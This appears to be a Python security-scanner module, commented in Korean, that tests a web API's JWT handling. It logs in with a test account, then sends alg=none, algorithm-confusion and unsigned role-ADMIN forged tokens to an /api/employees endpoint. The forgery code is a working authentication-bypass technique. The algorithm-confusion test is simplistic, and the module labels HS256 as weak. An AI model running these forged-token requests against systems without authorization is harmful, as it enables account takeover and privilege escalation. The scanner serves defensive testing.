"""
JWT Vulnerabilities Scanner
JWT 토큰 관련 보안 취약점 탐지
"""
import requests
import json
import base64
import re

def scan(target_url):
    result = {
        'name': 'JWT Vulnerabilities',
        'category': 'Authentication',
        'status': 'SAFE',
        'severity': 'CRITICAL',
        'vulnerabilities': [],
        'recommendation': '강력한 시크릿 키 사용, alg 검증, 토큰 만료 확인, RS256 사용 권장',
        'details': ''
    }

    details = []

    # 1. JWT 토큰 획득 시도
    details.append("[JWT-1] JWT 토큰 획득")

    jwt_token = None
    login_url = f"{target_url}/api/auth/login"

    try:
        # 테스트 계정으로 로그인 시도
        login_data = {
            "employeeId": "test",
            "password": "test123"
        }

        resp = requests.post(login_url, json=login_data, timeout=5)

        if resp.status_code == 200:
            try:
                response_data = resp.json()
                jwt_token = response_data.get('token')

                if jwt_token:
                    details.append(f"  ✓ JWT 토큰 획득 성공")
                else:
                    details.append(f"  • JWT 토큰 없음")
            except:
                # 헤더에서 토큰 찾기
                if 'Authorization' in resp.headers:
                    jwt_token = resp.headers['Authorization'].replace('Bearer ', '')
                    details.append(f"  ✓ 헤더에서 JWT 토큰 획득")
        else:
            details.append(f"  • 로그인 실패 (테스트 계정 없음)")

    except:
        details.append(f"  • 로그인 엔드포인트 접근 실패")

    # JWT 토큰이 있으면 분석
    if jwt_token:
        # 2. JWT 구조 분석
        details.append("\n[JWT-2] JWT 토큰 구조 분석")

        try:
            parts = jwt_token.split('.')

            if len(parts) != 3:
                result['vulnerabilities'].append("잘못된 JWT 형식")
                details.append(f"  ✗ JWT가 3개 파트로 구성되지 않음")
                result['status'] = 'VULNERABLE'
            else:
                # 헤더 디코딩
                try:
                    header_data = base64.urlsafe_b64decode(parts[0] + '==').decode('utf-8')
                    header = json.loads(header_data)
                    details.append(f"  • Header: {json.dumps(header, indent=2)}")

                    # 알고리즘 확인
                    alg = header.get('alg', 'none')

                    # 3. None 알고리즘 취약점
                    details.append("\n[JWT-3] None 알고리즘 테스트")

                    if alg.lower() == 'none':
                        result['vulnerabilities'].append("JWT에서 'none' 알고리즘 사용")
                        details.append(f"  ✗ alg=none 사용 (서명 없음)")
                        result['status'] = 'VULNERABLE'
                    else:
                        details.append(f"  ✓ 알고리즘: {alg}")

                        # None 알고리즘으로 변조 시도
                        none_header = base64.urlsafe_b64encode(
                            json.dumps({"alg": "none", "typ": "JWT"}).encode()
                        ).decode().rstrip('=')

                        payload_data = base64.urlsafe_b64decode(parts[1] + '==').decode('utf-8')
                        none_payload = parts[1]

                        none_token = f"{none_header}.{none_payload}."

                        # None 알고리즘 토큰으로 요청
                        test_resp = requests.get(
                            f"{target_url}/api/employees",
                            headers={"Authorization": f"Bearer {none_token}"},
                            timeout=5
                        )

                        if test_resp.status_code == 200:
                            result['vulnerabilities'].append("None 알고리즘 우회 가능")
                            details.append(f"  ✗ None 알고리즘으로 인증 우회됨")
                            result['status'] = 'VULNERABLE'
                        else:
                            details.append(f"  ✓ None 알고리즘 차단됨")

                    # 4. 약한 알고리즘
                    details.append("\n[JWT-4] 약한 알고리즘 검증")

                    weak_algorithms = ['HS256', 'HS384', 'HS512']
                    if alg in weak_algorithms:
                        details.append(f"  ⚠ 대칭키 알고리즘 사용: {alg}")
                        details.append(f"     권장: RS256 (비대칭키) 사용")
                        result['vulnerabilities'].append(f"약한 알고리즘 사용: {alg}")

                    # 5. 알고리즘 혼동 공격 (RS256 → HS256)
                    details.append("\n[JWT-5] 알고리즘 혼동 공격")

                    if alg == 'RS256':
                        # RS256을 HS256으로 변경 시도
                        confused_header = base64.urlsafe_b64encode(
                            json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
                        ).decode().rstrip('=')

                        confused_token = f"{confused_header}.{parts[1]}.{parts[2]}"

                        test_resp = requests.get(
                            f"{target_url}/api/employees",
                            headers={"Authorization": f"Bearer {confused_token}"},
                            timeout=5
                        )

                        if test_resp.status_code == 200:
                            result['vulnerabilities'].append("알고리즘 혼동 공격 가능")
                            details.append(f"  ✗ RS256 → HS256 변경 허용됨")
                            result['status'] = 'VULNERABLE'
                        else:
                            details.append(f"  ✓ 알고리즘 혼동 차단됨")

                except Exception as e:
                    details.append(f"  • 헤더 디코딩 실패: {str(e)}")

                # 페이로드 디코딩
                try:
                    payload_data = base64.urlsafe_b64decode(parts[1] + '==').decode('utf-8')
                    payload = json.loads(payload_data)
                    details.append(f"\n  • Payload: {json.dumps(payload, indent=2)}")

                    # 6. 토큰 만료 검증
                    details.append("\n[JWT-6] 토큰 만료 검증")

                    if 'exp' in payload:
                        import time
                        exp_time = payload['exp']
                        current_time = int(time.time())

                        if exp_time < current_time:
                            details.append(f"  • 토큰 만료됨")

                            # 만료된 토큰으로 요청
                            test_resp = requests.get(
                                f"{target_url}/api/employees",
                                headers={"Authorization": f"Bearer {jwt_token}"},
                                timeout=5
                            )

                            if test_resp.status_code == 200:
                                result['vulnerabilities'].append("만료된 토큰 허용")
                                details.append(f"  ✗ 만료된 토큰으로 인증 성공")
                                result['status'] = 'VULNERABLE'
                            else:
                                details.append(f"  ✓ 만료된 토큰 거부됨")
                        else:
                            details.append(f"  ✓ exp 클레임 존재")
                    else:
                        result['vulnerabilities'].append("exp 클레임 없음")
                        details.append(f"  ✗ exp (만료시간) 클레임 없음")
                        result['status'] = 'VULNERABLE'

                    # 7. 민감 정보 노출
                    details.append("\n[JWT-7] 페이로드 민감 정보")

                    sensitive_fields = ['password', 'secret', 'api_key', 'private_key', 'ssn']
                    for field in sensitive_fields:
                        if field in payload or field in str(payload).lower():
                            result['vulnerabilities'].append(f"페이로드에 민감 정보: {field}")
                            details.append(f"  ✗ 민감 정보 포함: {field}")
                            result['status'] = 'VULNERABLE'

                    # 8. 사용자 정보 변조 시도
                    details.append("\n[JWT-8] 페이로드 변조 테스트")

                    try:
                        # role을 ADMIN으로 변경
                        modified_payload = payload.copy()

                        if 'role' in modified_payload:
                            modified_payload['role'] = 'ADMIN'
                        else:
                            modified_payload['role'] = 'ADMIN'

                        modified_payload_encoded = base64.urlsafe_b64encode(
                            json.dumps(modified_payload).encode()
                        ).decode().rstrip('=')

                        # 서명 없이 토큰 생성
                        modified_token = f"{parts[0]}.{modified_payload_encoded}."

                        test_resp = requests.get(
                            f"{target_url}/api/employees",
                            headers={"Authorization": f"Bearer {modified_token}"},
                            timeout=5
                        )

                        if test_resp.status_code == 200:
                            result['vulnerabilities'].append("페이로드 변조 허용")
                            details.append(f"  ✗ 변조된 토큰으로 인증 성공")
                            result['status'] = 'VULNERABLE'
                        else:
                            details.append(f"  ✓ 페이로드 변조 차단됨")

                    except:
                        details.append(f"  • 페이로드 변조 테스트 실패")

                except Exception as e:
                    details.append(f"  • 페이로드 디코딩 실패: {str(e)}")

        except Exception as e:
            details.append(f"  • JWT 분석 실패: {str(e)}")

    else:
        details.append("  • JWT 토큰을 획득하지 못해 추가 테스트 불가")

    # 9. JWT 재사용 테스트
    details.append("\n[JWT-9] 토큰 재사용 검증")

    if jwt_token:
        try:
            # 같은 토큰으로 여러 번 요청
            for i in range(3):
                resp = requests.get(
                    f"{target_url}/api/employees",
                    headers={"Authorization": f"Bearer {jwt_token}"},
                    timeout=5
                )

                if resp.status_code == 200:
                    continue
                else:
                    break

            details.append(f"  • 토큰 재사용 가능 (Stateless)")
            details.append(f"     권장: 토큰 블랙리스트 또는 jti 클레임 사용")

        except:
            pass

    if result['status'] == 'SAFE':
        details.append("\n✓ JWT 보안이 적절히 구현되어 있습니다")

    result['details'] = '\n'.join(details)
    return result
